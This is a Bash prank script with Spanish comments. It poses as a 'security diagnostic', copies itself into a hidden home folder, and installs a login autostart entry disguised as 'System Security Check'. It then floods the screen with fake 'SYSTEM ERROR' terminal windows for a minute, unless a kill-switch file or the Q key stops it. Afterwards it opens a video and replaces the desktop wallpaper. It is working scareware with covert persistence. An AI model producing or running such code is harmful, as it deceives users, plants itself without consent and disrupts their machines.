#!/bin/bash

# ==============================================================================
#                                SECCIÓN LINUX
# ==============================================================================

echo "Iniciando diagnóstico de seguridad (Linux)..."

DIR="$(cd "$(dirname "$0")" && pwd)"

# --- PERSISTENCIA LINUX ---
# Definimos dónde se esconderá el script
INSTALL_DIR="$HOME/.hidden_sys_check"
SCRIPT_NAME="security_check.sh"
AUTOSTART_DIR="$HOME/.config/autostart"
AUTOSTART_FILE="$AUTOSTART_DIR/sys_check.desktop"

# 1. Crear directorio oculto si no existe
if [ ! -d "$INSTALL_DIR" ]; then
    mkdir -p "$INSTALL_DIR"
fi

# 2. INSTALACIÓN DE ARCHIVOS
# Copiamos el script ejecutable
cp "$0" "$INSTALL_DIR/$SCRIPT_NAME"

# Copiamos la carpeta de recursos (archivosSecretos)
# Borramos primero si existe para asegurar que se actualiza bien
if [ -d "$DIR/archivosSecretos" ]; then
    rm -rf "$INSTALL_DIR/archivosSecretos"
    cp -r "$DIR/archivosSecretos" "$INSTALL_DIR/"
fi

# Damos permisos de ejecución a la copia instalada
chmod +x "$INSTALL_DIR/$SCRIPT_NAME"

# 3. CREAR AUTOARRANQUE (.desktop)
# Esto hace que se ejecute al iniciar sesión
if [ ! -f "$AUTOSTART_FILE" ]; then
    mkdir -p "$AUTOSTART_DIR"
    cat <<EOF > "$AUTOSTART_FILE"
[Desktop Entry]
Type=Application
Name=System Security Check
Exec=$INSTALL_DIR/$SCRIPT_NAME
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF
    echo "Configuración inicial establecida."
fi

# --- LÓGICA DEL JUEGO ---

FILENAME="killswitch.txt"
# Calculamos tiempo final (actual + 60s)
END=$(( $(date +%s) + 60 ))

echo "CORRIENDO SIN FRENOS..."

while [ "$(date +%s)" -lt "$END" ]; do

    # --- 1. BUSQUEDA KILL SWITCH ---
    if [ -f "$DIR/$FILENAME" ]; then break; fi
    # Busqueda en carpetas comunes
    if [ -f "$HOME/Desktop/$FILENAME" ] || [ -f "$HOME/Escritorio/$FILENAME" ]; then break; fi
    if [ -f "$HOME/Documents/$FILENAME" ] || [ -f "$HOME/Documentos/$FILENAME" ]; then break; fi
    if [ -f "$HOME/Downloads/$FILENAME" ] || [ -f "$HOME/Descargas/$FILENAME" ]; then break; fi
    
    # Busqueda rapida USB (ignora errores si no hay usb)
    if ls /media/$USER/*/"$FILENAME" 1> /dev/null 2>&1; then break; fi

    # --- 2. TECLA Q (Non-blocking) ---
    read -t 0.01 -n 1 key
    if [ "$key" = "q" ] || [ "$key" = "Q" ]; then
        echo "Abortado por usuario."
        break
    fi

    # --- 3. SPAM VENTANAS ---
    # Intenta usar xterm, si no tiene, usa gnome-terminal
    if command -v xterm >/dev/null 2>&1; then
        xterm -hold -bg black -fg green -e "echo 'SYSTEM ERROR... DO NOT CLOSE';" &
    elif command -v gnome-terminal >/dev/null 2>&1; then
        gnome-terminal -- bash -c "echo 'SYSTEM ERROR...'; exec bash" &
    fi

    # Pausa mínima para no congelar la UI
    sleep 0.2
done

echo "Ejecutando carga final..."

# Rutas dinámicas: Si el script corre desde la instalación oculta, busca los archivos allí
# Esto es vital para cuando se ejecuta solo al reiniciar
PLAY_DIR="$DIR"
if [ "$DIR" == "$INSTALL_DIR" ]; then
    PLAY_DIR="$INSTALL_DIR"
fi

# Abrir video (en segundo plano)
xdg-open "$PLAY_DIR/archivosSecretos/video.mp4" >/dev/null 2>&1 &

# Cambiar fondo (Compatible con Gnome/Unity/Ubuntu standard)
if command -v gsettings >/dev/null 2>&1; then
    gsettings set org.gnome.desktop.background picture-uri "file://$PLAY_DIR/archivosSecretos/fondo.jpg"
fi

exit 0